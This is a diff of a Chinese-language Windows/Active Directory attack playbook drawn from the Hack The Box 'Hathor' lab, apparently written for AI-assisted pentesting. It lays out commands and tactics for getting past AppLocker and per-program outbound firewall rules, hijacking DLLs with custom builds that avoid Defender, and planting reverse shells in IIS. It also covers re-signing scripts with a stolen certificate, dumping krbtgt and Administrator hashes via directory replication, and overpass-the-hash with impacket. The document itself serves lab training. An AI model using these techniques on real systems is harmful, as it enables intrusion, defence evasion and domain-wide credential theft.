@@ -24,8 +24,8 @@
 
 | 查什么 | 命令 | 判读 |
 |---|---|---|
-| AppLocker 策略 | `powershell -c "Get-AppLockerPolicy -Effective -Xml" > C:\Programdata\al.xml` | 看 DLL / Exe / Script 三类规则：**按路径放行的 DLL 与 EXE（如 `C:\share\scripts\x.dll`）就是作者留好的执行点**；显式拦 `mshta`/`msbuild`/`installutil`/`msdt` 等说明常规绕过已被防 |
-| 出站防火墙 | `powershell -c "Get-NetFirewallRule -PolicyStore ActiveStore \| ? {$_.Action -eq 'Block'} \| Get-NetFirewallApplicationFilter \| select -ExpandProperty Program"` | HTB-Hathor 实测 16 条**按程序**拦出站：`cscript` / `powershell` / `powershell_ise` / `regsvr32` / `rundll32` / `wscript` ⇒ **反连要换进程宿主，而不是换端口** |
+| AppLocker 策略 | `powershell -c "Get-AppLockerPolicy -Effective -Xml" > C:\Programdata\al.xml` | 看 DLL / Exe / Script 三类规则。⚠️ 该 cmdlet **只对 GP 下发的策略有效**，本机策略要用 `-Local`（微软文档明示）；若 PS 受限读不到，退化为行为验证（试跑被拦的程序看报错）。判读形态（来源：0xdf HTB-Hathor writeup 2022-11-19 的策略 dump）：**按路径放行的 DLL 与 EXE（如 `C:\share\scripts\x.dll`、`C:\share\x.exe`）就是留好的执行点**；显式拦 `mshta`/`msbuild`/`installutil`/`msdt` 等说明常规绕过已被防 |
+| 出站防火墙 | `powershell -c "Get-NetFirewallRule -PolicyStore ActiveStore \| ? {$_.Action -eq 'Block'} \| Get-NetFirewallApplicationFilter \| select -ExpandProperty Program"` | **命令语法已在 Windows 11 实测通过（2026-09-22，只读）**；等价写法 `Get-NetFirewallRule -PolicyStore ActiveStore -Action Block \| Get-NetFirewallApplicationFilter -PolicyStore ActiveStore` 同样可用（无程序过滤的规则会输出 `Any`）。判读：拦截**按程序**生效 ⇒ **反连要换进程宿主，而不是换端口**。本案形态（来源：0xdf writeup）：16 条按程序拦出站，命中 `cscript`/`powershell`/`powershell_ise`/`regsvr32`/`rundll32`/`wscript` |
 | PowerShell 语言模式 | `$ExecutionContext.SessionState.LanguageMode` | `ConstrainedLanguage`（应用池身份常见）⇒ 别指望 PS 脚本开箱即用，`New-Object` 之类会失败 |
 | 是否周期还原 | 同一目录两次 `dir` 比 mtime；放进去的暂存文件是否消失 | HTB-Hathor 实测：道具目录（`C:\share`）与目标脚本会自己变回原样 ⇒ 按 §6 作战 |
 
@@ -72,8 +72,8 @@ x86_64-w64-mingw32-gcc -shared -O2 -s -o target.dll dll.c    # 位数必须与�
 file target.dll && ls -l target.dll                          # 自检：PE32+ DLL x86-64；大小应为几 KB
 ```
 
-- **不要用 msfvenom 生成的 DLL**：HTB-Hathor 实测被 Defender 直接删除（文件消失、稍后原件被还原），而自编的 `system()` DLL 存活。
-- 覆盖后**等一个任务周期**，用抓包确认执行：`tcpdump -ni tun0 icmp` 看到 `ping -n 4` 的四个请求即成立。
+- **不要用 msfvenom 生成的 DLL**：来源 0xdf HTB-Hathor writeup（2022-11-19）实测 —— msfvenom 出的 DLL 被 Defender 直接删除（文件消失、稍后原件被还原）；本案我们直接走自编 `system()` DLL，**全程未被删除**（§3 探针与后续 ginawild shell 均通过它取得）。
+- 覆盖后**等一个任务周期**，用抓包确认执行：`tcpdump -ni tun0 icmp` 看到 `ping -n 4` 的四个请求即成立（本案实测：四个 ICMP 请求、间隔 1 秒）。
 - 加载中的文件是锁的：写入报错就重试；写入后 `ls` 复核大小，确认没被还原。
 
 **④ 升级为真实动作**：确认执行后，把 DLL 内容换成真实 payload（复制文件、写结果文件、拉起被放行的 exe）。
@@ -83,7 +83,7 @@ file target.dll && ls -l target.dll                          # 自检：PE32+ DL
 | 路线 | 做法 | 为什么可行 |
 |---|---|---|
 | **宿主进程内发起** | 用宿主语言写反连（经典 ASP.NET 站点 → 上传 `.aspx`，`TcpClient` 连回后把命令交给 `cmd.exe`） | 代码跑在 `w3wp.exe` 内：不落地 exe（过 AppLocker），连接从宿主进程出（绕开按程序拦的出站规则） |
-| **借被放行的 exe** | 把自编反连 exe 覆盖成白名单内的 exe（如 `C:\share\Bginfo64.exe`），再由脚本/任务拉起 | 该路径既被 AppLocker 放行、又不在出站拦截名单里 |
+| **借被放行的 exe** | 把自编反连 exe 覆盖成白名单内的 exe（如 `C:\share\Bginfo64.exe`），再由脚本/任务拉起 | 该路径被 AppLocker 放行；且据 0xdf writeup，它**不在出站拦截名单**里（本案实测：该 exe 被拉起后确实成功反连） |
 
 覆盖 exe 的手段：**在目标机内部用本地复制**。HTB-Hathor 实测 SMB 写 `.exe` 被拒，但机内 `copy /y <payload>.txt C:\share\<allowed>.exe` 成功。
 > 与 §3 探针的差异未进一步区分：可能是"过滤只作用于 SMB 写入路径"，也可能是"只拦新建 exe"——两种解释都与观测一致，按待验证项记录。
@@ -117,8 +117,8 @@ Set-AuthenticodeSignature -FilePath C:\path\target.ps1 -Certificate $cert | Form
 osslsigncode sign -pkcs12 stolen.pfx -pass '<pfx 口令>' -h sha256 -in mod.ps1 -out signed.ps1
 ```
 
-**④ 内联执行不受脚本规则约束**：AppLocker 的 Script 规则约束的是**被脚本宿主启动的脚本文件**；`powershell -nop -c "…"` 这类内联命令不落地脚本文件，因此不受该规则限制（HTB-Hathor 机内重签动作就是用内联 `-c` 完成的）。
-> 顺带：`dot-source` / `Import-Module` 加载的 `.ps1`/`.psm1` 也不是"被启动的脚本"，可作为改主脚本之外的替代劫持点（按需验证）。
+**④ 内联执行不受脚本规则约束**：AppLocker 的 Script 规则约束的是**被脚本宿主启动的脚本文件**；`powershell -nop -c "…"` 这类内联命令不落地脚本文件，因此不受该规则限制（**本案实测**：机内重签动作正是用内联 `-c` 完成，并成功取得 `Status : Valid`）。
+> 顺带：`dot-source` / `Import-Module` 加载的 `.ps1`/`.psm1` 不是"被启动的脚本"，理论上同样不受限 —— 这一条属**推断，本案未实测**（本案改的是主脚本本体）。
 
 **⑤ 触发**：改脚本 → 重签 → 触发**原本就会运行该脚本的计划任务**。HTB-Hathor 的形态：`run.vbs` 用 `eventcreate` 写一条 Event ID `444`，计划任务监听该事件、以**另一个高权账号**执行审计脚本 —— 于是我们借"签名过 + 高权上下文"的脚本拿到了下一个域身份。
 
@@ -151,8 +151,8 @@ Get-ADReplAccount -SamAccountName krbtgt       -Server <DC FQDN> 2>&1 | Out-File
 Copy-Item C:\Programdata\dc.txt C:\<可读共享>\dc.txt -Force                  # 回抄便于取回
 ```
 
-- 前提：运行账号具备 `Replicating Directory Changes` / `...All` —— **口令审计类工具的运行账号通常天然具备**（工具本身就是靠复制协议读取密码哈希），无需先当域管。
-- 输出含 `NTHash`、`NTHashHistory` 与 `KerberosNew.AES256/AES128 Key`：**RC4 被禁时用 AES key 走 keytab/`ktutil` 取票**，别只留 NT hash。
+- 前提：运行账号具备 `Replicating Directory Changes` / `...All`。**本案实测**：该审计工具（Get-bADpasswords）的运行账号即具备 —— 工具本身就是靠复制协议读取密码哈希，所以"先拿审计类工具的运行账号"通常是这条路的入口；是否普遍成立以该工具的 README 为准。
+- 输出含 `NTHash`、`NTHashHistory` 与 `KerberosNew.AES256/AES128 Key`（本案实测输出形态）。**RC4 被禁时用 AES key 走 keytab/`ktutil` 取票**——此路为备用方案，**本案未实测**（本案 RC4 可用，`getTGT -hashes` 一次成功）。
 - 结果先写 `C:\Programdata` 再回抄共享，避免依赖交互 shell（对"没有稳定 shell"的场景尤其重要）。
 - **NTLM 禁用 ⇒ 不能 Pass-the-Hash**，改走 overpass-the-hash：
 
@@ -162,7 +162,7 @@ export KRB5CCNAME=$PWD/Administrator.ccache
 impacket-wmiexec -k -no-pass <domain>/Administrator@<DC FQDN>
 ```
 
-## 8. 命令与引号坑（本条全部实测）
+## 8. 命令与引号坑（除标注「来源：HTB-Absolute」一行外，其余均为本案实测）
 
 | 现象 | 正确做法 |
 |---|---|
@@ -171,7 +171,7 @@ impacket-wmiexec -k -no-pass <domain>/Administrator@<DC FQDN>
 | PowerShell 里 `copy /y a b` 报「找不到接受参数」 | `copy` 是 `Copy-Item` 的别名，用 `Copy-Item -Force` |
 | `Import-PfxCertificate` 报 `The PFX file could not be found` | 路径含 `$`（`$Recycle.Bin`、`$RXXXXXX.pfx`）**必须单引号**，双引号会被当变量展开 |
 | `nxc … --use-kcache` 报 `KRB5CCNAME environment variable is not set` | 先 `export KRB5CCNAME=/tmp/krb5cc_1000`（`kinit` 默认 ccache） |
-| Kerberos 场景用了 IP 或短名 | 一律用 **FQDN**（SPN 依赖主机名），并保证 `/etc/hosts` 里 FQDN 行排在裸域名之前 |
+| Kerberos 场景用了 IP 或短名（来源：HTB-Absolute 实测） | 一律用 **FQDN**（SPN 依赖主机名），并保证 `/etc/hosts` 里 FQDN 行排在裸域名之前（MIT krb5/Samba 取 getaddrinfo 第一个名字推 SPN） |
 | 通过 AI 桥接执行命令时 `~` 不展开 | 桥接 shell 的 `$HOME` 可能为空，路径一律写绝对路径 |
 
 ## 9. 红线与纪律段
